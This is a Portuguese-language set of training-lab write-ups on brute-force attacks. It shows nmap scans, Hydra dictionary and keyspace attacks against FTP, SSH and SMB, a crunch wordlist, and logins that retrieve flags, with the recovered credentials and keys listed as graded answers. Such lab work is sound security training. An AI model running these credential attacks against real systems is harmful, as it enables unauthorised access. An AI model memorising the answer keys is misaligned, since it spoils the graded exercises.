
### SEMANA 10 - BRUTE FORCE - LOW HANGING FRUIT

### LAB 01 - Autenticação FTP (Low Hanging Fruit)

---

**ID do Lab:** `b0b876df226fd5f0c4907a8870602e42fef87930`

**Pergunta:** Realize um teste "Low-Hanging Fruits" no serviço FTP, no intervalo de rede 172.16.1.10 a 172.16.1.200, e informe qual host foi possível se autenticar.

**Resposta:** Iniciamos mapeando a rede alvo para identificar hosts com o serviço FTP (Porta 21) ativo. O Nmap encontrou dois hosts: `172.16.1.33` e `172.16.1.108`. Em seguida, utilizamos o **Hydra** para testar credenciais padrão e fracas contra esses alvos. O ataque foi bem-sucedido contra o host `172.16.1.108`, que aceitou múltiplas combinações de usuário/senha fracas (ex: `ftp:ftp`, `ftp:password`, etc.), indicando uma configuração extremamente vulnerável.

**Passo a Passo Técnico:**

1. **Varredura de Rede (Nmap):**
    
    Bash
    
    ```
    nmap --open -v -sV -sS -p 21 -Pn 172.16.1.10-200 -oG ftp.txt
    ```
    
    _Resultado:_ Hosts 172.16.1.33 e 172.16.1.108 identificados.
    
2. **Ataque de Dicionário (Hydra - Teste Padrão):** Testamos primeiro as credenciais anônimas (`ftp:ftp`).
    
    Bash
    
    ```
    hydra -v -l ftp -p ftp -M ftp.txt ftp
    ```
    
    _Resultado:_ Sucesso no host 172.16.1.108.
    
3. **Ataque de Dicionário (Hydra - Wordlist):** Para confirmar a vulnerabilidade, rodamos uma lista maior de usuários e senhas comuns.
    
    Bash
    
    ```
    hydra -v -L top-usernames-shortlist.txt -P top-passwords-shortlist.txt -M ftp.txt ftp
    ```
    

**Resultado Obtido:**

- **Host Autenticado:** `172.16.1.108`
    

### Evidências (Nmap e Hydra)

![](../assets/Pasted%20image%2020251201010810.png)
![](../assets/Pasted%20image%2020251201010817.png)

### Enumeração Web e Brute Force SSH

---

**ID do Lab:** `69aea36648bd5786f727222f712661948e28d78`

**Pergunta:** Consiga acesso shell para obter a key e pontuar. (Alvo: 172.30.0.126)

**Resposta:** Realizamos uma enumeração de diretórios no serviço HTTP (porta 80) e localizamos uma lista de possíveis usuários. Filtramos os nomes mais prováveis e realizamos um ataque de força bruta contra o serviço SSH (que rodava na porta não-padrão 55225). Com as credenciais obtidas (`suporte:harrypotter`), conectamos ao servidor e localizamos a flag no arquivo `information` dentro do diretório `/home/dados`.

**Passo a Passo Técnico:**

1. **Enumeração de Diretórios (Web):** Utilizamos o `gobuster` (ou similar) para encontrar arquivos expostos. Localizamos um arquivo contendo uma lista de funcionários/usuários. _(Nota: A lista bruta foi salva em `usuariosencontrados.txt` e depois filtrada)._
    
2. **Refinamento da Wordlist:** Analisamos a lista e selecionamos apenas os usuários com perfil técnico ou administrativo (ex: suporte, ti, cpd), salvando em `userencontrado.txt`.
    
3. **Ataque de Força Bruta (Hydra):** Disparamos o Hydra contra o SSH na porta 55225, usando a lista de usuários filtrada e uma wordlist de senhas padrão (`unix_passwords.txt`).
    
    Bash
    
    ```
    hydra -L userencontrado.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt -s 55225 172.30.0.126 ssh -t 4
    ```
    
    _Resultado:_ Senha encontrada para o usuário **`suporte`**: **`harrypotter`**.
    
4. **Acesso e Captura da Flag:** Conectamos via SSH e navegamos pelo sistema de arquivos.
    
    Bash
    
    ```
    ssh -p 55225 suporte@172.30.0.126
    # Senha: harrypotter
    cat /home/dados/information
    ```
    

**Resultado Obtido:**

- **Credencial:** `suporte` / `harrypotter`
    
- **Key:** `6a21d7719769735184256720a340619c`
    

### Evidências (Processo Completo)

_(Wordlist de Usuários)_ _(Hydra Sucesso)_ _(Conexão SSH)_ _(Leitura da Flag)_
![](../assets/Pasted%20image%2020251201042402.png)
![](../assets/Pasted%20image%2020251201042405.png)

![](../assets/Pasted%20image%2020251201042423.png)


### SEMANA 10 - BRUTE FORCE - SMB & KEYSPACE

###  - Quebra de Senha SMB (Keyspace)

---

**ID do Lab:** `4dfb3c9485124ead5aace054e4ad747b9fe4fcd4`

**Pergunta:** Monte uma wordlist utilizando a técnica de "keyspace brute force" para o usuário "dev01" e descubra qual a senha do usuário.

**Resposta:** Durante a fase de enumeração SNMP, identificamos o usuário `dev01`. Com a dica de que a senha seguia o padrão "devXXXX" (4 dígitos numéricos), criamos uma wordlist personalizada com todas as combinações possíveis (dev0000 a dev9999) usando o `crunch`. Em seguida, utilizamos o **Hydra** para atacar o serviço SMB (Porta 445) e descobrimos a senha.

**Passo a Passo Técnico:**

1. **Geração de Wordlist (Keyspace):**
    
    Bash
    
    ```
    crunch 7 7 -t dev%%%% -o senhadev.txt
    ```
    
2. **Ataque de Força Bruta (Hydra):**
    
    Bash
    
    ```
    hydra -l dev01 -P senhadev.txt 172.30.0.103 smb
    ```
    
    _Resultado:_ Senha encontrada `dev0105`.
    

**Credencial Obtida:** `dev01:dev0105`

### Evidência (Hydra)
![](../assets/Pasted%20image%2020251201032135.png)

---

###  - Acesso a Compartilhamento Restrito

**ID do Lab:** `b70bccfd8166690b2887c3fc97b326af576ec1a0`

**Pergunta:** Utilize as credenciais obtidas anteriormente e obtenha a key para pontuar.

**Resposta:** Com as credenciais validadas (`dev01:dev0105`), utilizamos o `smbclient` para listar e acessar os compartilhamentos do servidor `172.30.0.103`. Identificamos um compartilhamento chamado `Utils$`. Ao conectar nele, navegamos até o diretório `Programas\KEY` e lemos o arquivo `key.txt`.

**Passo a Passo Técnico:**

1. **Listagem de Compartilhamentos:**
    
    Bash
    
    ```
    smbclient -L //172.30.0.103 -U dev01 --password dev0105
    ```
    
2. **Acesso e Leitura (SMBClient):**
    
    Bash
    
    ```
    smbclient //172.30.0.103/Utils$ -U dev01 --password dev0105
    smb: \> cd Programas\KEY\
    smb: \> more key.txt
    ```
    

**Resultado Obtido:**

- **Key:** `dda0c5e6dd7250fdee0facbf22e2182e`
    

### Evidência (Acesso SMB)
![](../assets/Pasted%20image%2020251201032145.png)


###  - Ataque de Força Bruta (Hydra)

---

**ID do Lab:** `cd7934bae1fa0f13e8591bf60db7c4f49c985fd7` 
**ID do Lab (Variação):** `f7b150a5930e797289e2035328f2d3fbb327ef12`

**Pergunta:** Realize um ataque de força bruta no serviço e descubra a senha do usuário `dev` no host 172.16.1.33. Informe a key encontrada.

**Resposta:** Identificamos o serviço FTP rodando na porta 21 do host `172.16.1.33`. Sabendo que o usuário alvo era `dev`, utilizamos o **Hydra** com uma wordlist padrão do Metasploit (`unix_passwords.txt`) para realizar um ataque de dicionário. Após descobrir a senha, conectamos ao servidor FTP e baixamos o arquivo `key.txt`.

**Passo a Passo Técnico:**

1. **Ataque de Força Bruta (Hydra):**
    
    Bash
    
    ```
    hydra -v -l dev -P /usr/share/wordlists/metasploit/unix_passwords.txt ftp://172.16.1.33
    ```
    
    _Resultado:_ Senha encontrada: **`america`**.
    
2. **Acesso e Exfiltração (FTP):** Conectamos ao servidor com as credenciais obtidas (`dev:america`).
    
    Bash
    
    ```
    ftp ftp://dev:america@172.16.1.33
    ftp> ls
    ftp> cat key.txt
    ```
    

**Resultados Obtidos:**

- **Credencial:** `dev` / `america`
    
- **Key:** `935355642827`
    

### Evidências

![](../assets/Pasted%20image%2020251201040129.png)![](../assets/Pasted%20image%2020251201040132.png)
